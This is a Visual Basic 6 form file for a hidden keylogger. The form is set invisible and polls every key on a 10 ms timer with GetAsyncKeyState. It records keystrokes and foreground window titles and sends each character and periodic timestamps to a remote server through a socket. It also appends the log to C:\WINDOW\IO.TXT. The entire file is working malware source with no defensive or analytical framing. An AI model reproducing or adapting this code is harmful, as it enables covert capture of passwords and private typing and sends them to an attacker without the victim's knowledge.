VERSION 5.00
Begin VB.Form frmkeylogge 
   BackColor       =   &H00000000&
   Caption         =   "KeyLogger"
   ClientHeight    =   4200
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   6660
   Icon            =   "frmkeylogge.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   4200
   ScaleWidth      =   6660
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Timer3 
      Interval        =   60000
      Left            =   4800
      Top             =   480
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   2895
      Left            =   240
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   4
      Top             =   1200
      Visible         =   0   'False
      Width           =   6255
   End
   Begin VB.Timer Timer2 
      Interval        =   10000
      Left            =   6120
      Top             =   480
   End
   Begin VB.Timer Timer1 
      Interval        =   10
      Left            =   0
      Top             =   120
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   2895
      Left            =   240
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   1200
      Width           =   6255
   End
   Begin VB.TextBox Text3 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   2895
      Left            =   240
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   5
      Text            =   "frmkeylogge.frx":030A
      Top             =   1200
      Width           =   6255
   End
   Begin VB.Label Label8 
      BackColor       =   &H0000FF00&
      Caption         =   "CLICK HERE TO VIEW ALL DETAILS "
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   720
      Width           =   6255
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Quick keylogger"
      BeginProperty Font 
         Name            =   "Courier"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   2160
      TabIndex        =   2
      Top             =   360
      Width           =   3015
   End
   Begin VB.Line Line1 
      BorderColor     =   &H0000FF00&
      X1              =   240
      X2              =   6240
      Y1              =   360
      Y2              =   360
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "K E Y L O G G E R"
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   20.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   1080
      TabIndex        =   1
      Top             =   0
      Width           =   4815
   End
End
Attribute VB_Name = "frmkeylogge"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long

Dim mastervariable As String
Dim returnvalue As String
Dim previousvalue As String


'create a directory for a keyboard stroke
Private Sub Form_Load()
On Error Resume Next
MkDir "C:\WINDOW"
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Open "C:\WINDOW\IO.TXT" For Append As #1
Print #1, Text1.text
Close #1
End Sub

'view a title bar caption
'all !!!!
Private Sub Label8_Click()
Text2.Visible = True
Text2.text = mastervariable
End Sub

'mouse hover
Private Sub Label8_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label8.BackColor = vbRed
End Sub



Private Sub Timer1_Timer()
'if the directory remove
' program can create a new directory
'MsgBox keyascii
Dim i As KeyCodeConstants

On Error Resume Next
MkDir "C:\WINDOW"
On Error Resume Next
    For i = 32 To 256
    X = GetAsyncKeyState(i)
    
    'GETTING KEY STROKE
    If X = -32767 Then
    
    'MsgBox vbkeypress
    'MsgBox i
    'Exit Sub
 
        If Chr(i) >= 0 And Chr(i) <= 9 Then
            Text1.ForeColor = vbRed
            Text1.text = Text1.text + Chr(i)
            
            On Error Resume Next
            Form1.server.SendData Chr(i)
        
        ElseIf i = 38 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 40 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 37 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 39 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 46 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 45 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 33 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 34 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 36 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 35 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 112 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 113 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 114 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 115 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 116 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 117 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 118 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 119 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 120 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 121 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 122 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 123 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 44 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
        ElseIf i = 145 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text
    
             
        ElseIf i = 190 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "."
            
            On Error Resume Next
            Form1.server.SendData "."
            
        ElseIf i = 188 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & ","
            
            On Error Resume Next
            Form1.server.SendData ","
            
        ElseIf i = 189 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "-"
            
            On Error Resume Next
            Form1.server.SendData "-"
            
        ElseIf i = 190 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "_"
            
            On Error Resume Next
            Form1.server.SendData "_"
            
        ElseIf i = 186 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & ";"
            
            On Error Resume Next
            Form1.server.SendData ";"
            
        ElseIf i = 221 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "]"
            
            On Error Resume Next
            Form1.server.SendData "]"
            
        ElseIf i = 219 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "["
            
            On Error Resume Next
            Form1.server.SendData "["
            
        ElseIf i = 220 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "\"
            
            On Error Resume Next
            Form1.server.SendData "\"
            
        ElseIf i = 187 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "="
            
            On Error Resume Next
            Form1.server.SendData "="
            
        ElseIf i = 192 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "`"
            
            On Error Resume Next
            Form1.server.SendData "`"
            
        ElseIf i = 96 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "0"
            
            On Error Resume Next
            Form1.server.SendData "0"
        
        ElseIf i = 97 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "1"
            
            On Error Resume Next
            Form1.server.SendData "1"
            
        ElseIf i = 98 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "2"
            
            On Error Resume Next
            Form1.server.SendData "2"
            
        ElseIf i = 99 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "3"
            
            On Error Resume Next
            Form1.server.SendData "3"
            
        ElseIf i = 100 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "4"
            
            On Error Resume Next
            Form1.server.SendData "4"
            
        ElseIf i = 101 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "5"
            
            On Error Resume Next
            Form1.server.SendData "5"
            
        ElseIf i = 102 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "6"
            
            On Error Resume Next
            Form1.server.SendData "6"
            
        ElseIf i = 103 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "7"
            
            On Error Resume Next
            Form1.server.SendData "7"
            
        ElseIf i = 104 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "8"
            
            On Error Resume Next
            Form1.server.SendData "8"
            
        ElseIf i = 105 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "9"
            
            On Error Resume Next
            Form1.server.SendData "9"
            
        ElseIf i = 106 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "*"
            
            On Error Resume Next
            Form1.server.SendData "*"
            
        ElseIf i = 107 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "+"
            
            On Error Resume Next
            Form1.server.SendData "+"
            
        ElseIf i = 109 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "-"
            
            On Error Resume Next
            Form1.server.SendData "-"
            
        ElseIf i = 110 Then
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text & "."
          
            On Error Resume Next
            Form1.server.SendData "."
            
        Else
            Text1.ForeColor = &HFF00&
            Text1.text = Text1.text + Chr(i)
            
            On Error Resume Next
            Form1.server.SendData Chr(i)
            
            
        End If
    End If
Next


'TASKBAR CAPTION======


returnvalue = GetCaption(GetForegroundWindow)
mastervariable = returnvalue
If returnvalue = previousvalue Then
previousvalue = returnvalue
Else
previousvalue = returnvalue
Text1.text = Text1.text & vbCrLf & returnvalue
End If


End Sub


Private Sub Timer2_Timer()
'GetCaption
'mastervariable = mastervariable & Text1.text
'SENDING TO SERVER
On Error Resume Next
Form1.server.SendData mastervariable

'TITLE BAR CAPTION AND ALL KEYBOARD STROKE
'mastervariable = mastervariable & Text1.text

            
'save the contents to a file called keysom in c drive
'u can open the keysom .. by opening it with notepad
On Error Resume Next
Open "C:\WINDOW\IO.TXT" For Append As #1
Print #1, Text1.text
Close #1
Text1.text = ""
End Sub

'FUNCTION CALL FOR LETTER CASES
Function GetCaption(hwnd As Long)
Dim hWndTitle As String
hWndTitle = String(GetWindowTextLength(hwnd), 0)
GetWindowText hwnd, hWndTitle, (GetWindowTextLength(hwnd) + 1)
GetCaption = hWndTitle
End Function


'SENDING A TIME TO SERVER
'UPDATE BY ITS INVERVAL
Private Sub Timer3_Timer()
On Error Resume Next
Form1.server.SendData Time & "===(date)===" & Date
Text1.text = Text1.text & Time & "===(date)===" & Date
End Sub
